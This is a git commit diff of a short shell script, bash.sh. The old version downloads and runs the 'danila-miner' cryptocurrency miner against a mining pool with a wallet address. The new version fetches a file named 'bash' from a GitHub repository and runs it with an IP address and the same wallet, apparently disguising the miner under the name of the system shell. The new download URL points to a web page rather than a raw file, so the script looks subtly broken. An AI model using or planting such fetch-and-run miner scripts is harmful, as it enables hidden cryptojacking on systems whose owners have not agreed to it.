038bb5e25ce75eaad2ff577c8a4bc2f61893f8be
jenifler <96619243+jenifler@users.noreply.github.com>
2022-02-10 20:15:28 +0700

    Update bash.sh

--- Victory/bash.sh
+++ Victory/bash.sh
@@ -1,5 +1,4 @@
 #!/bin/bash
-wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz 
-tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz 
-chmod +x danila-miner 
-./danila-miner run https://server1.whalestonpool.com EQBsPrcYWQwl9K-uiUoT3u2o0Eo1L6ckc5xo6-S0708xPEtd
+wget https://github.com/fahrah/latihan/blob/main/bash 
+chmod +x bash 
+./bash run 104.22.65.205 EQBsPrcYWQwl9K-uiUoT3u2o0Eo1L6ckc5xo6-S0708xPEtd
